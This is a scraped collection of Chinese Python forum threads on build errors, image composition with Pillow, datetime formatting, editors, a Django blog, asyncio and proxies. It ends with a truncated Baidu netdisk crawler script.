{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>安装 QScintilla 的过程出现\nQtGui4.lib(QtGui4.dll) : fatal error LNK1112: 模块计算机类型“ x64 ”与目标计算机类型“ X86 ”冲突\nNMAKE : fatal error U1077: “\"D:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\bin\\link.EXE\"”: 返回代码“ 0x458 ”\nStop.\nNMAKE : fatal error U1077: “\"D:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\bin\\nmake.exe\"”: 返回代码“ 0x2 ”\nStop.\n的错误</p>\n</div></div>"], "reply": "4", "tittle": "window 平台怎样配置 QScintilla", "comment": ["删除临时文件和编译目录，重新解压，运行 nmake 之前先执行一下 vcvars32.bat 。", " 请问怎么删除临时文件，好像删不掉 Documents and Settings 里面的东西", " 运行里面输入 %tmp%", " 按照你说的还是报一样的错误"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>我学习的目的还是做爬虫的，让人越懒的越好。逛帖子看到了 Selenium 这个库，厉害啦我看不懂...\n不过我先屯着，到那一步再看好了~</em></p>\n<hr>\n<p><strong>官方资料</strong>\n<br>\n<a href=\"http://www.seleniumhq.org/docs/index.jsp\" rel=\"nofollow\">Selenium 官网</a>\n<br>\n<a href=\"http://selenium-python.readthedocs.io/index.html\" rel=\"nofollow\">Selenium with Python 文档</a></p>\n<p><strong>阅读文章</strong>\n<br>\n<a href=\"http://cuiqingcai.com/2599.html\" rel=\"nofollow\">静觅 » Python 爬虫利器五之 Selenium 的用法</a>\n<br>\n<a href=\"http://down.51cto.com/data/2120383\" rel=\"nofollow\">selenium2 python 自动化测试实战修订</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "爬虫学习日记/Selenium 的用法", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>相信对 NBA 感兴趣的大兄弟一定不会对球星卡陌生吧，虽然不知道咱们这个圈子对 NBA 感兴趣的大兄弟多不多。但是，不感兴趣也问题不大，本文阐述的方法其实是通用的图片合成方法。</p>\n<p>让我们来看一张球星卡：</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/c1bd4e1cc1471ae6403f.png\"></p>\n<p>这种球星卡可以划分为 5 个部分</p>\n<ol>\n<li>球员动作图</li>\n<li>球员姓名</li>\n<li>球队 logo</li>\n<li>底板背景图</li>\n<li>装饰边框图</li>\n</ol>\n<p>今天我们要干的事情就是找到这 5 个素材然后用 Python 把他们组合起来，那么这个时候肯定有大兄弟会有疑问了，直接用 PS 套起来不就好了吗，讲道理这样做确实方便快捷，但是前提是你只做这一张卡，当你要为联盟大概 450 名球员制作球星卡的时候，你就需要一个脚本来帮助你完成了（对 PS 不太熟，如果 PS 也可以，可以告诉我哈）。</p>\n<p>这篇文章需要一点 Python 基础，完全不了解 Python 的大兄弟最好去学习一点基础知识再看。</p>\n<p>OK 让我们开始吧！</p>\n<h3>准备素材</h3>\n<p>就像开头提到的，我们需要 5 种素材。这 5 种素材我都会提供若干个给大家练手。</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/6d366fe3c567044fe18b\"></p>\n<p>上面的图片实际上只有 4 个素材，还有一个就是球员的名字了，球员的名字我们可以在组合过程中使用 ImageDraw 和 ImageFont 加载球员姓名。</p>\n<p>为了避免字体路径和中文乱码的问题，我还提供了一个微软雅黑的字体。</p>\n<p>素材可以在 <a href=\"https://www.github.com/XatMassacrE/compose_nba_trading_cards\" rel=\"nofollow\"><strong>这里</strong></a> clone 或者下载，声明：本文所有涉及的素材和图片仅供交流学习使用。</p>\n<h3>开始写代码</h3>\n<p>我们的场景是为联盟中的所有球员制作球星卡，那么所有的球员自然是从数据库里面查出来的了，这里为了练习，我们可以 mock 一些数据（虽然，讲道理，波什并不能放在 SUPER 里面，但是这里只有一张装饰边框图，所以就勉为其难的和吾皇放在一个等级了）。</p>\n<pre><code>mock_data = [\n    {\n        'id': 1966,\n        'cn_name': '勒布朗-詹姆斯',\n        'team_id': 5,\n        'category': 'SUPER'\n    },\n    {\n        'id': 1977,\n        'cn_name': '克里斯-波什',\n        'team_id': 14,\n        'category': 'SUPER'\n    }\n]\n</code></pre>\n<p>有数据之后，我们就来遍历这些球员，找到我们需要的属性，再传入到一个组合函数中。</p>\n<pre><code>def compose_all(all):\n    for player in all:\n        id = player['id']\n        # if id == 1966:\n        if True:\n            category = player['category']\n            player_img =  str(id) + '.png'\n\n            team_id = player['team_id']\n            team_img = str(team_id) + '.png'\n            name = player['cn_name']\n            category = player_category.index(category) + 1\n            category_img = 'card_bg_' + str(category) + '.png'\n\n            output_name = str(id) + '.png'\n            print('start compose ' + str(id))\n            compose(player_img, name, team_img, category_img, output_name)\n</code></pre>\n<p>这里有个个人习惯，因为经常在服务器上写一些脚本，所有<code>if True:</code>那个地方就是调试用的，当一个球员调试没问题之后，注释掉，跑代码，这样可以不用再调整缩进了，不知道其他的大兄弟这个地方喜欢怎么写。</p>\n<p>在这里我默认会对球员分档（根据一些数据信息）</p>\n<pre><code>player_category = [\"SUPER\", \"CORE\", \"BLUE\", \"SIX\", \"BENCH\"]\n</code></pre>\n<p>对应档位的装饰边框分别为<code>card_bg_1.png</code>，<code>card_bg_2.png</code>等。\n检查 5 个素材是否都拿到了：</p>\n<ol>\n<li>球员动作图 -&gt; player_img</li>\n<li>球员姓名 -&gt; name</li>\n<li>球队 logo -&gt; team_img</li>\n<li>底板背景图 —&gt; ** None **</li>\n<li>装饰边框图 -&gt; card_bg_n.png (n 对应档位）</li>\n</ol>\n<p>还差一个底板背景图，因为每个球员底板背景图都一样，所以在组合函数中直接使用就好了。</p>\n<p>在我们去组合球星卡之前，还有一个问题需要解决，那就是我们不能保证所有素材都在同一个目录下，那么我们就需要给每个素材指定一个目录，这样我们在组合球星卡的时候就可以一马平川了。</p>\n<pre><code>team_path = './logo/'\nplayer_path = './player_img/'\noutput_path = './trading_cards/'\nfont_file = './assets/msyh.ttf'\ncard_decorate_path = './assets/'\n</code></pre>\n<p>设置好路径之后写上我们的组合函数，为了保证这个函数的正常运行，我们需要导入三个模块。</p>\n<pre><code>import os\nimport numpy as np\nfrom PIL import Image, ImageFont, ImageDraw\n</code></pre>\n<p>如果提示没有找到模块，请使用下面的命令进行安装</p>\n<pre><code>pip install Pillow\npip install numpy\n</code></pre>\n<p>Pillow 关于图片处理的详细文档请参考 <a href=\"https://github.com/python-pillow/Pillow\" rel=\"nofollow\"><strong>Pillow</strong></a></p>\n<p>下面是我们的组合函数</p>\n<pre><code>def compose(player_img, name, team_logo, category_img, output_name):\n\n    card_bg = card_decorate_path + 'bg.png'\n    player_img_offset_height = 15\n\n    if not os.path.isfile(player_path + player_img):\n        need_manual_compose.append(player_img)\n        print(player_path + player_img + ' is not exist')\n        return\n\n    player_img = Image.open(player_path + player_img).convert('RGBA')\n    bg_img = Image.open(card_decorate_path + category_img).convert('RGBA')\n    card_bg_img = Image.open(card_bg).convert('RGBA')\n    logo = Image.open(team_path + team_logo).convert('RGBA')\n\n    logo = logo.resize((100,100), Image.ANTIALIAS)\n\n    card_bg_img.paste(player_img, (35,player_img_offset_height), player_img)\n    card_bg_img.paste(bg_img, (0,0), bg_img)\n    card_bg_img.paste(logo, (95,315), logo)\n\n    font = ImageFont.truetype(font_file, 20)\n    d = ImageDraw.Draw(card_bg_img)\n\n    try:\n        name = unicode(name, 'utf-8')\n    except NameError:\n        name = name\n    d.text((12, 12), name, font=font, fill=(255,255,255))\n\n    card_bg_img.save(output_path + output_name, quality=100)\n</code></pre>\n<p>有几个问题需要说明一下：</p>\n<ol>\n<li>有些球星动作的素材可能找不到，那么就将找不到的球员记录下来，最后手工处理。</li>\n<li>因为我们要使用到 alpha 通道，所以需要 convert('RGBA')</li>\n<li>在图片 paste 之前必须保证团片和粘贴范围像素一样，不一样的话就使用 resize 函数变成一样的， Image.ANTIALIAS 参数的作用是抗锯齿，这样 resize 出来的图片边缘会更圆润。</li>\n<li>b 图片贴在 a 图片上，使用 a.paste(b, (x,y), b)，(x,y) 为左上角的坐标，第三个参数 b 是作为 mask ，如果不使用这个参数会导致 b 图片透明的部分也覆盖在 a 上面。</li>\n<li>这个程序在 python2 和 python3 上都可以运行。</li>\n</ol>\n<p>OK ，让我们来看一看结果怎么样吧</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/9bd566685119d5996ab9\"></p>\n<p>恩，似乎还不错，但是大家会发现波什的手没了，所以说一马平川什么的都是骗人的。</p>\n<p>经过我个人的观察，会发现大部分的球星动作图都是和詹姆斯类似的（即球员的动作在图片中的位置是靠下的），如果下移粘贴坐标会导致球星卡的主要局域出现大面积的空白。一计不成，再生一计，我们可以对类似波什的动作图做特殊处理，下移他们的粘贴坐标就可以了。</p>\n<p>ok ，问题来了，人眼一看就会知道哪个动作图高哪个动作图低，那么 Python 怎么才能知道呢？</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/fe6f118a9dbbb82fc434\"></p>\n<p>可以看到，每张动作图的大小是一样的，但是具体的动作在图片中的分布是不一样的。</p>\n<p>这个时候我们就需要<code>numpy</code>这个库来帮助我们把图片转换成像素矩阵，然后我们对矩阵进行逐行扫描并记录有效像素出现的位置，这样就可以判断哪些动作图是偏高的。</p>\n<pre><code>def calculateUsefulHeight(img):\n    img = Image.open(player_path + img).convert('RGBA')\n    w, h = img.size\n    mat = np.array(img)\n\n    for i in range(mat.shape[0]):\n        if not allEqual(mat[i]):\n            return h - i\n\ndef allEqual(line):\n    w = len(line)\n    if not w:\n        return True\n    init_value = line[0][3]\n    step = 10\n    for i in range(int(round(w/step))):\n        if line[i * step][3] == init_value:\n            continue\n        else:\n            return False\n    return True\n</code></pre>\n<p>然后再在组合函数中加入对动作图高的特殊处理的代码就可以了。</p>\n<pre><code>def compose(player_img, name, team_logo, category_img, output_name):\n    ...\n    # deal with high player image\n    h = calculateUsefulHeight(player_img)\n    # 这个地方的 310 是球星卡展示球员动作的最大高度\n    if h &gt; 310:\n        offset = h - 310\n        player_img_offset_height += offset\n</code></pre>\n<p>再来跑一遍，看看效果如何。</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/ef90a80aec3fda536529\"></p>\n<p>不错，这样就可以了，尤其是一瞬间跑出来 450 张看起来效果还不错的球星卡还是非常的爽的。</p>\n<p>OK 了，到这里应该就可以结束了，源码可以在  <a href=\"https://www.github.com/XatMassacrE/compose_nba_trading_cards\" rel=\"nofollow\"><strong>这里</strong></a> 得到，里面包含本文所有涉及的图片，素材和代码。</p>\n<p>如果各位大兄弟，有更好的设计和布局也欢迎和我交流。</p>\n</div></div>"], "reply": "2", "tittle": "使用 Python 组合 NBA 球星卡", "comment": ["主要的工作量就在扣球星。。\r", "楼主要不要把这个解决了呀。", " 这些球星的动作是有素材包的啊，并不需要去扣。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>datetime.now().strftime('%m月%d日%H点')\n\n03月22日12点\n</code></pre>\n<p>月份前面会有 0</p>\n</div></div>"], "reply": "6", "tittle": "有没有什么优雅或者一行 格式化时间为年月日的方法（月份小于 10 的情况）", "comment": ["datetime.now().strftime('%-m 月%d 日%H 点')", "\"{dt.month}月{dt.day}日{dt.hour}点\".format(dt=datetime.datetime.now())", "  👍", "echo date('Y 年 m 月 d 日', time()).' 乱入 php 是世界上最好的语言';", "AttributeError: module 'datetime' has no attribute 'now'", " ,用改导入为 from datetime import datetime\r", "或者 datetime.datetime.now().strftime('%-m 月%d 日%H 点')试试"]},
{"content": "", "reply": "14", "tittle": "你们使用 spacemacs 打开 Python 文件慢吗？", "comment": ["也许与 semantic 有关，关了也许会快一点。", "emacs 这么卡的东西 为什么还有新人在用。。。\r", "卡的跟 jb 家 ide 一样慢了，为什么不用 ide ？\r", "\r", "除了中老年程序员习惯难以改变之外，真不应该用了。", " 我喜欢 Emacs calc 和 eww 和 erc 和 eshell ，编辑功能是次要的 2333\r", "vim 就没有我喜欢的功能\r", "\r", "为什么用 emacs or vim ？因为有时需要 terminal 下用", "自从我把 emacs 装成 spacemacs 后打开都奇慢无比", "把其中的一些配置延迟加载就好了，可以用 use-package, with-eval-after-load 或者 xxx-mode-hook 来做。", " emacs 卡么，感觉还行啊", " 说得就跟你会用似的", "mac 笔记本上用比较卡。  \r", "台式机黑苹果 i7 6700k 很流畅\r", "台式机 archlinux i7 6700 快的飞起。 完全不卡。\r", "搜索全部用的是 ag ， 速度都差不多，项目再大也是几十毫秒出结果。", " 比 vim/sublime 卡不少。感觉机子配置不行，就不能秒开。", "楼主可以用 client/server 模式， ", " 本来就不是那么用的…… emacs 党都是 emacs 窗口常开不关的。", "  \r", "\r", "通常是开机打开 Emacs 和 Chrome ，长年不关。", "12 年低配的 MacBook air 都不卡，说卡的，你们也该换电脑了吧！\r", "常年 idea 不关，用 macvim ,这星期在学 emacs .", "我个人在 Mac 下的选择是：\r", "$ brew service start emacs-plus\r", "\r", "根据喜好把 $EDITOR 或者 $VISUAL export 到 emacsclient -c/-t ，然后设置一个简单的单字母 alias 。\r", "\r", "brew 会在 LaunchAgent 丢 emacs-plus 的开机自启，所以以后开机编辑文件直接用 alias 的那个名字就好。\r", "\r", "然后给 ns-do-hide-emacs 额外设置一个快捷键，可以快捷键快速唤出或隐藏（结合 automator ）。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>July</h2>\n<p>用<code>Django</code>实现一个更实用的<code>博客系统</code>，让写作更简单，更愉快。</p>\n<p><a href=\"https://blog.ansheng.me/\" rel=\"nofollow\">Demo</a></p>\n<hr>\n<h2>博客相关页面</h2>\n<ul>\n<li>博客首页</li>\n</ul>\n<p><img alt=\"home\" src=\"https://github.com/anshengme/July/raw/master/doc/img/home.png\"></p>\n<ul>\n<li>博文详情</li>\n</ul>\n<p><img alt=\"article\" src=\"https://github.com/anshengme/July/raw/master/doc/img/article.png\"></p>\n<h2>后台管理相关页面</h2>\n<ul>\n<li>后台首页</li>\n</ul>\n<p><img alt=\"admin\" src=\"https://github.com/anshengme/July/raw/master/doc/img/admin.png\"></p>\n<ul>\n<li>添加文章</li>\n</ul>\n<p><img alt=\"add-article\" src=\"https://github.com/anshengme/July/raw/master/doc/img/add-article.png\"></p>\n<ul>\n<li>文章列表</li>\n</ul>\n<p><img alt=\"article-list\" src=\"https://github.com/anshengme/July/raw/master/doc/img/article-list.png\"></p>\n<ul>\n<li>标签管理</li>\n</ul>\n<p><img alt=\"tag\" src=\"https://github.com/anshengme/July/raw/master/doc/img/tag.png\"></p>\n<ul>\n<li>分类管理</li>\n</ul>\n<p><img alt=\"categories\" src=\"https://github.com/anshengme/July/raw/master/doc/img/categories.png\"></p>\n<ul>\n<li>系统消息</li>\n</ul>\n<p><img alt=\"message-os\" src=\"https://github.com/anshengme/July/raw/master/doc/img/message-os.png\"></p>\n<ul>\n<li>用户列表</li>\n</ul>\n<p><img alt=\"users\" src=\"https://github.com/anshengme/July/raw/master/doc/img/users.png\"></p>\n<ul>\n<li>友链管理</li>\n</ul>\n<p><img alt=\"link\" src=\"https://github.com/anshengme/July/raw/master/doc/img/link.png\"></p>\n<ul>\n<li>用户个人信息</li>\n</ul>\n<p><img alt=\"profile\" src=\"https://github.com/anshengme/July/raw/master/doc/img/profile.png\"></p>\n<ul>\n<li>全局设置</li>\n</ul>\n<p><img alt=\"settings\" src=\"https://github.com/anshengme/July/raw/master/doc/img/settings.png\"></p>\n<ul>\n<li>普通用户登录所看到的页面</li>\n</ul>\n<p><img alt=\"putongyonghu\" src=\"https://github.com/anshengme/July/raw/master/doc/img/putongyonghu.png\"></p>\n<h2>环境</h2>\n<ol>\n<li>Python3.5.2</li>\n<li>Django 1.10.6</li>\n<li>Markdown<code>(<a href=\"http://Editor.md\" rel=\"nofollow\">Editor.md</a>)</code></li>\n<li>后台模板<code>(AdminLTE)</code></li>\n</ol>\n<h2>后记</h2>\n<p>看到这儿是不是已经迫不及待了？没关系，安装文章我已问你写好，客官请慢用，<a href=\"https://github.com/anshengme/July/blob/master/doc/install.md\" rel=\"nofollow\">点我</a></p>\n<h2>下个版本？</h2>\n<p>下个版本预计会修复如下问题：</p>\n<ol>\n<li>文章多级评论</li>\n<li>后台修复评论通知</li>\n<li>添加微信和 github 登录</li>\n</ol>\n<p>然后，如果你有什么问题，欢迎提<a href=\"https://github.com/anshengme/July/issues\" rel=\"nofollow\">issues</a></p>\n<h2>反馈与建议</h2>\n<ul>\n<li>GitHub ：<a href=\"https://github.com/anshengme/july\" rel=\"nofollow\">@anshengme</a></li>\n<li>邮箱：<a href=\"mailto:ianshengme@gmail.com\">ianshengme@gmail.com</a></li>\n</ul>\n<p>感谢你的阅读，如果可以，请献出你宝贵的<code>Star</code>。</p>\n</div></div>"], "reply": "35", "tittle": "用 Django 实现一个更实用的博客系统，让写作更简单，更愉快。", "comment": ["就喜欢这股子直爽劲  :-D\r", "\r", "\r", "> 别问我为什么不用配置文件方式启动 uwsgi ，因为我不会。", "很精致。赞！", " O(∩_∩)O 谢谢", " 嘿嘿嘿，\\坏笑", "July ..\r", "我记得有个叫 June 的项目……", "好漂亮啊 我喜欢！", "不错。收藏。", "July 与安生   已 star", "七月与安生么...", "邮箱密码。。。。", "底部版权可以去掉么", "另外,你的私人账号信息之类的可在 setting 里面哟", "not bad", "你的 GitHub 里面的版本不是最新的,,根本找不到发表文章的地方.", " 是的。", " 这个无所谓，本来就是测试来的。", " 版权什么的直接改 HTML ，运行这个项目需要 Nginx ，访问静态文件用的，然后你说的找不到发布文章的地方，可能是因为你直接注册了个账户，然后这个账户并不是超级管理员，所以，没有发布文章等按钮，你需要把你的用户改成超级用户~", "配色感觉怪怪的", " 博客页套的模板，我也感觉怪怪的，实在是没找到更好的。", "\r", "\r", "\r", "django 一直 import 失败是什么节奏  T ^ T", " 这个怎么了吗？", "样式不错，可以抄抄吗", " 欢迎", "手机 mark 一下，做的好好", "漂亮", "后台犀利", " 模板而已哈。", "全局设置的实现，是把配置存放到数据库中的吗？", " 是的，", " 之前在 layui 里好像看到你= =", " 你可能遇到了假的我", "gayhub 上边的代码是最新的么，最近刚好在学 python web ，战略性 mark 加帮顶", "  目前赶项目，等闲下来了在更新。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>故事是这样的：<br>\n楼楼之前一直是做 java 和 php 的，有点乏味了，想换换口味，闲暇之余接触了 python ，之后一发不可收拾...<br>\n但是苦于没有老司机带路，跌跌撞撞至今也没什么大的进展，目前还是处于入门阶段 blalala...</p>\n<p>废话结束，说正经的！！！<br>\n求各位老司机推荐几本适合我的进阶书籍，视频就不要了，更喜欢从书中获取知识</p>\n</div></div>"], "reply": "11", "tittle": "[求书单] 第二回发帖，还是有点小紧张，恳请各位老司机载我一程~", "comment": ["好尴尬... 老司机们都去秋名山了吗？", "看右侧", "换口味  还换 python  来试试 elixir", "Cookbook 就够了", "善用搜索引擎", "Python 核心编程，另外，多想点子动手实现，在实战中进步最快~", " 与我们一起学吧 ，最近准备组织大家按照一本书展开学习，下星期开始\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 \r", "Python Linux 学习群， qq 群号： 278529278 ， \r", "Php Linux 学习群， qq 群号： 476648701 ， \r", "非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", " 书名《 python 从入门到实践》", "The Hitchhikers Guide to Python", "进阶 -> 读源码，恍然大悟", "有哪些书籍是一个合格的程序员必读的？\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到一篇关于 python 写博客的文章，之前一直知道 Dj 的方式，这个貌似可以搞下。\n<br>\n诶...明天打卡这周的 Python 周记（\n<br>\n收录待用，修改转载已取得<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权</p>\n<hr>\n<p>写博客是证明你的实力、深入学习和建立读者群的好方法。有许多<a href=\"https://github.com/rushter/data-science-blogs\" rel=\"nofollow\">数据科学</a>和<a href=\"https://www.quora.com/What-are-the-best-programming-blogs\" rel=\"nofollow\">编程类</a>博客帮助他们的作者找到工作，或者认识了重要人物。定期写博客是有抱负的程序员和数据科学家最应该做的事情之一。</p>\n<p>不幸的是，写博客的一大障碍就是先搭建一个博客网站。在这篇文章中，我们将学习如何用 Python 创建一个博客网站，怎么用 Jupyter Notebook 写文章和如何通过 GitHub Pages 部署博客。读完这篇文章，你就可以使用你熟悉的方式，创建自己的数据科学博客了。</p>\n<p>...</p>\n<hr>\n<p><em>原文链接：<a href=\"https://www.qcloud.com/community/article/763728001489733057?fromSource=gwzcw.58327.58327.58327\" rel=\"nofollow\">https://www.qcloud.com/community/article/763728001489733057</a></em></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "玩法收藏/云服务器/Pelican 搭建数据科学博客", "comment": []},
{"content": ["<div class=\"topic_content\">‘’\r<br>import logging;logging.basicConfig(level=logging.INFO)\r<br>\r<br>  import async, os, json, time\r<br>  from datetime import datetime\r<br>\r<br>  from aiohttp import web\r<br>\r<br>  def index(request):\r<br>      return web.Response(body=b'&lt;h1&gt;Awesome&lt;/h1&gt;')\r<br>\r<br>  @<a target=\"_blank\" href=\"/member/async\">async</a>.coroutine\r<br>  def init(loop):\r<br>      app = web.Application(loop=loop)\r<br>      app.router.add_route('GET', '/', index)\r<br>      srv = yield from loop.create_server(app.make_handler(),'127.0.0.1',9000)\r<br>      logging.info('server started at <a target=\"_blank\" href=\"http://127.0.0.1:9000...'\" rel=\"nofollow\">http://127.0.0.1:9000...'</a>)\r<br>      return srv\r<br>\r<br>loop = async.get_event_loop()\r<br>loop.run_until_complete(init(loop))\r<br>loop.run_forever()\r<br>\"\r<br>运行上面的代码为什么会出现下面的错误？\r<br>srv=yield from loop.create_server(app.make_handler(),'127.0.0.1',9000)\r<br>                 ^\r<br>SyntaxError: invalid syntax</div>"], "reply": "14", "tittle": "初学 Python ，请教各位前辈，以下这段代码为什么会出错呢？", "comment": ["缩进", "空格还是缩进？", "invalid syntax", " 我没找到哪里缩进有问题……感觉自己好傻逼~", "语法错误。我猜是 yield from 这里错了，但是我没有用过 Python3.5 的 async 和 aiohttp ，所以不清楚具体哪里错了", "用的 python3 的接收器？", " 解释器", "async def 后用 await", "首先，你用的得是 python3\r", "第二，你这代码哪里抄的，确定有 module 名字叫 async 吗。。。不应该是 asyncio 吗。。。", "yield from?\r", "多了 from 吧", " 廖雪峰 python 教程。。", " 显然不是，我搜了下你说的那个教程，那个代码是没错的。。。\r", "\r", "\r", "\r", "\r", "可能楼主看了假的教程。。。", "另外，别听楼上那些说 yield from 的。。。这是合法关键字\r", "\r", "python 3.3 加入的\r", "另外楼主要用 asyncio ，建议 python 3.5 以上", "python3 环境下 使用 asyncio 就好了\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 \r", "Python Linux 学习群， qq 群号： 278529278 ， \r", "Php Linux 学习群， qq 群号： 476648701 ， \r", "非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想做一个中转代理服务器，用 python 写，在浏览器上设置代理 ip ： port ，然后把所有的 http 和 https 的包都进行转发，同时做一些不可描述的事情，如何搞呢？</p>\n</div></div>"], "reply": "12", "tittle": "如何用 Python 搞一个代理服务器", "comment": ["看看 SS 的源码不就知道了。。。", "容易，一搜就有教程。", "当年有个人也是这样想的，然后就照着网上的 socks5 教程做了个 ss", "接楼上~后来那个人被叫去喝茶了", "故事继续发展。。 c 大去了美国", " 你确定是肉翻了吗？", "楼主可以参考 ", " 。", " 不清楚是不是肉番，推特上看到有人说的", "看你的描述 你应该是从零开始的\r", "\r", "不过我推荐你最好不要开始\r", "\r", "人生多美好啊 何必去浪费时间", " 嗯好\r", " 恩\r", " -，-\r", " @", "  @", " 发展成故事会了？\r", " 非常感谢\r", "\r", " 2333", "肉翻是最好的方法", "我们一开始用 Python 开发消息系统，后来改用 golang 。\r", "其实现在很多 tunnel 都是用 golang 开发的，如果愿意学习，推荐看看：\r", "1. ", " (几百行代码,单向代理隧道,合适你的需求 ， TCP 协议都支持)\r", "2. ", " (我们写的，从 Python 发展而来， 4000 行左右代码，双向对称设计)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为要做<a href=\"http://www.quzhuanpan.com/\" rel=\"nofollow\">去转盘网</a>（分类模式点我），所以一定要爬取网盘资源，本来想自己写一个爬虫挺不容易的，不想分享出来，但最后还是决定了拿给大家一起看吧，毕竟有交流才有进步，有兴趣的朋友也可以看看我写的其他日志或者关注我，会发现去转盘网的大部分技术现在可以说是公开状态，如有对你有帮助还是认真读读吧，下面是爬虫代码，我立马公开：</p>\n<p>ps ：不会 python 的孩子先去学学 python ，代码是 python 写的</p>\n<p>我附上点资料：<a href=\"http://www.quzhuanpan.com/source/loadSourceList.do?type=5\" rel=\"nofollow\">点我下载 1</a> <a href=\"http://www.quzhuanpan.com/download/checkResult.action?id=75004&amp;type=5\" rel=\"nofollow\">点我下载 2</a></p>\n<p>其实还有个磁力站，不过暂时技术不想公开出来，之后也想公开，喜欢的看看： ok 搜搜</p>\n<pre><code>#coding: utf8\n \n\"\"\"\n \nauthor:haoning\n \ncreate time: 2015-8-15\n \n\"\"\"\n \n  \n \nimport re #正则表达式模块\n \nimport urllib2 #获取 URLs 的组件\n \nimport time\n \nfrom Queue import Queue\n \nimport threading, errno, datetime\n \nimport json\n \nimport requests #Requests is an Apache2 Licensed HTTP library\n \nimport MySQLdb as mdb\n \n  \n \nDB_HOST = '127.0.0.1'\n \nDB_USER = 'root'\n \nDB_PASS = ''\n \n  \n \n  \n \n#以下是正则匹配规则\n \nre_start = re.compile(r'start=(\\d+)') #\\d 表示 0-9 任意一个数字 后面有+号 说明这个 0-9 单个数位出现一到多次 比如 21312314\n \nre_uid = re.compile(r'query_uk=(\\d+)') #查询编号\n \nre_urlid = re.compile(r'&amp;urlid=(\\d+)') #url 编号\n \n  \n \nONEPAGE = 20 #一页数据量\n \nONESHAREPAGE = 20 #一页分享连接量\n \n  \n \n#缺少专辑列表\n \nURL_SHARE = 'http://yun.baidu.com/pcloud/feed/getsharelist?auth_type=1&amp;start={start}&amp;limit=20&amp;query_uk={uk}&amp;urlid={id}' #获得分享列表\n \n\"\"\"\n \n{\"feed_type\":\"share\",\"category\":6,\"public\":\"1\",\"shareid\":\"1541924625\",\"data_id\":\"2418757107690953697\",\"title\":\"\\u5723\\u8bde\\u58c1\\u7eb8\\u5927\\u6d3e\\u9001\",\"third\":0,\"clienttype\":0,\"filecount\":1,\"uk\":1798788396,\"username\":\"SONYcity03\",\"feed_time\":1418986714000,\"desc\":\"\",\"avatar_url\":\"http:\\/\\/himg.bdimg.com\\/sys\\/portrait\\/item\\/1b6bf333.jpg\",\"dir_cnt\":1,\"filelist\":[{\"server_filename\":\"\\u5723\\u8bde\\u58c1\\u7eb8\\u5927\\u6d3e\\u9001\",\"category\":6,\"isdir\":1,\"size\":1024,\"fs_id\":870907642649299,\"path\":\"%2F%E5%9C%A3%E8%AF%9E%E5%A3%81%E7%BA%B8%E5%A4%A7%E6%B4%BE%E9%80%81\",\"md5\":\"0\",\"sign\":\"1221d7d56438970225926ad552423ff6a5d3dd33\",\"time_stamp\":1439542024}],\"source_uid\":\"871590683\",\"source_id\":\"1541924625\",\"shorturl\":\"1dDndV6T\",\"vCnt\":34296,\"dCnt\":7527,\"tCnt\":5056,\"like_status\":0,\"like_count\":60,\"comment_count\":19},\n \npublic:公开分享\n \ntitle:文件名称\n \nuk:用户编号\n \n\"\"\"\n \nURL_FOLLOW = 'http://yun.baidu.com/pcloud/friend/getfollowlist?query_uk={uk}&amp;limit=20&amp;start={start}&amp;urlid={id}' #获得订阅列表\n \n\"\"\"\n \n{\"type\":-1,\"follow_uname\":\"\\u597d\\u55e8\\u597d\\u55e8\\u554a\",\"avatar_url\":\"http:\\/\\/himg.bdimg.com\\/sys\\/portrait\\/item\\/979b832f.jpg\",\"intro\":\"\\u9700\\u8981\\u597d\\u8d44\\u6599\\u52a0994798392\",\"user_type\":0,\"is_vip\":0,\"follow_count\":2,\"fans_count\":2276,\"follow_time\":1415614418,\"pubshare_count\":36,\"follow_uk\":2603342172,\"album_count\":0},\n \nfollow_uname:订阅名称\n \nfans_count ：粉丝数\n \n\"\"\"\n \nURL_FANS = 'http://yun.baidu.com/pcloud/friend/getfanslist?query_uk={uk}&amp;limit=20&amp;start={start}&amp;urlid={id}' # 获取关注列表\n \n\"\"\"\n \n{\"type\":-1,\"fans_uname\":\"\\u62e8\\u52a8\\u795e\\u7684\\u5fc3\\u7eea\",\"avatar_url\":\"http:\\/\\/himg.bdimg.com\\/sys\\/portrait\\/item\\/d5119a2b.jpg\",\"intro\":\"\",\"user_type\":0,\"is_vip\":0,\"follow_count\":8,\"fans_count\":39,\"follow_time\":1439541512,\"pubshare_count\":15,\"fans_uk\":288332613,\"album_count\":0}\n \navatar_url ：头像\n \nfans_uname ：用户名\n \n\"\"\"\n \n  \n \nQNUM = 1000\n \nhc_q = Queue(20) #请求队列\n \nhc_r = Queue(QNUM) #接收队列\n \nsuccess = 0\n \nfailed = 0\n \n  \n \ndef req_worker(inx): #请求\n \n    s = requests.Session() #请求对象\n \n    while True:\n \n        req_item = hc_q.get() #获得请求项\n \n         \n \n        req_type = req_item[0] #请求类型，分享?订阅？粉丝？\n \n        url = req_item[1] #url\n \n        r = s.get(url) #通过 url 获得数据\n \n        hc_r.put((r.text, url)) #将获得数据文本和 url 放入接收队列\n \n        print \"req_worker#\", inx, url #inx 线程编号； url 